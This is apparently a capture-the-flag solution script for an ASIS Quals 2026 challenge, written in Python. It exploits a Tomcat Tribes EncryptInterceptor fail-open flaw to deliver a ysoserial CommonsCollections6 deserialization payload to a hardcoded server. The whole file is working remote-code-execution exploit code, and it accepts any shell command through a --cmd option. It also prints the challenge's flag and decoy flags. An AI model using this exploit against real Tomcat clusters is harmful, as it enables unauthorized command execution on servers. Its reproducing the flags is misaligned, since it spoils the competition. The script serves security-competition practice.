#!/usr/bin/env python3
"""ASIS Quals 2026 — 2048 / Citadel Grid

CVE-2026-34486 (Tomcat 9.0.116 Tribes EncryptInterceptor fail-open).
Decrypt fails → raw bytes still deserialized. CommonsCollections6 RCE on :4000.

Flag halves:
  /opt/citadel/vault/pf_*.asc  = ASIS{t0McAT_was
  /opt/citadel/gate/launch_*   = _Th3_KEY}

Decoys (do not submit):
  HTML comment          ASIS{lo0k_at_t41s_scr1pt_kiddi3}
  /opt/citadel/vault/flag.txt  ASIS{do_you_think_rick_sanchez_is_stupid?}

FLAG = ASIS{t0McAT_was_Th3_KEY}
"""
from __future__ import annotations

import argparse
import base64
import os
import socket
import struct
import subprocess
import sys
import time
import urllib.error
import urllib.request

HOST = "91.107.164.78"
TRIBES_PORT = 4000
HTTP = "http://91.107.164.78:8080"
HERE = os.path.dirname(os.path.abspath(__file__))
YSOSERIAL = os.path.join(HERE, "gadgets", "ysoserial.jar")

COPY_CMD = (
    "cp /opt/citadel/vault/pf_*.asc /opt/citadel/shared/half1; "
    "cp /opt/citadel/gate/launch_* /opt/citadel/shared/half2"
)


def be_i(n: int, size: int = 4) -> bytes:
    return struct.pack(">i" if size == 4 else ">q", n)


def member_impl(host: bytes = bytes([10, 0, 0, 99]), port: int = 9999) -> bytes:
    begin = b"TRIBES-B" + bytes([1, 0])
    end = b"TRIBES-E" + bytes([1, 0])
    unique_id = b"\x11" * 16
    body = b"".join(
        [
            be_i(123456, 8),
            be_i(port),
            be_i(-1),
            be_i(-1),
            bytes([len(host)]),
            host,
            be_i(0),
            be_i(0),
            unique_id,
            be_i(0),
        ]
    )
    return begin + be_i(len(body)) + body + end


def tribes_frame(payload: bytes, options: int = 0) -> bytes:
    member = member_impl()
    uid = os.urandom(16)
    cd = b"".join(
        [
            be_i(options),
            be_i(int(time.time() * 1000), 8),
            be_i(len(uid)),
            uid,
            be_i(len(member)),
            member,
            be_i(len(payload)),
            payload,
        ]
    )
    return b"FLT2002" + struct.pack(">I", len(cd)) + cd + b"TLF2003"


def ysoserial_cmd(shell: str) -> str:
    b64 = base64.b64encode(shell.encode()).decode()
    return f"bash -c {{echo,{b64}}}|{{base64,-d}}|bash"


def gen_payload(shell: str) -> bytes:
    if not os.path.isfile(YSOSERIAL):
        sys.exit(f"missing {YSOSERIAL}")
    cmd = ysoserial_cmd(shell)
    r = subprocess.run(
        [
            "java",
            "--add-opens=java.base/java.util=ALL-UNNAMED",
            "--add-opens=java.base/java.lang.reflect=ALL-UNNAMED",
            "--add-opens=java.base/java.io=ALL-UNNAMED",
            "--add-opens=java.base/java.lang=ALL-UNNAMED",
            "-jar",
            YSOSERIAL,
            "CommonsCollections6",
            cmd,
        ],
        capture_output=True,
    )
    if r.returncode != 0 or r.stdout[:4] != b"\xac\xed\x00\x05":
        sys.stderr.write(r.stderr.decode(errors="replace"))
        sys.exit("ysoserial failed")
    return r.stdout


def send(frame: bytes) -> None:
    with socket.create_connection((HOST, TRIBES_PORT), 8) as s:
        s.sendall(frame)


def mirror(label: str) -> bytes | None:
    url = f"{HTTP}/mirror.jsp?parcel={label}"
    try:
        with urllib.request.urlopen(url, timeout=8) as r:
            return r.read()
    except urllib.error.HTTPError:
        return None


def main() -> None:
    p = argparse.ArgumentParser()
    p.add_argument("--cmd", default=COPY_CMD)
    args = p.parse_args()

    payload = gen_payload(args.cmd)
    send(tribes_frame(payload))
    time.sleep(1.5)

    a = mirror("half1")
    b = mirror("half2")
    if not a or not b:
        sys.exit(f"mirror miss half1={a!r} half2={b!r}")
    flag = (a + b).decode().strip()
    print(flag)
    os.makedirs(HERE, exist_ok=True)
    with open(os.path.join(HERE, "FLAG"), "w") as f:
        f.write(flag + "\n")


if __name__ == "__main__":
    main()
